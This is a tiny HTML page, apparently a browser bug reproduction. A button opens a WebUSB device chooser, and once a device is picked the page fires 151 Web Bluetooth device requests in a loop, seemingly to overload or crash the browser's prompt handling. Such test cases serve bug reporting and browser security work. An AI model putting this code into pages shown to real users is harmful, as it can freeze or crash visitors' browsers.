
<html>
<head>
  <script>
    async function main() {
	
      dev = null;
      await navigator.usb
        .requestDevice({ filters: [] })
        .then((usbDevice) => {
          dev = usbDevice;
		  for (var i=1;i<152;i++){
		 navigator.bluetooth.requestDevice({
          filters: [{ services: ['battery_service'] }]
        });
		}
    });
      
	}
  </script>
</head>
<body>
  <button onclick="main()">click me</button>
</body>
</html>
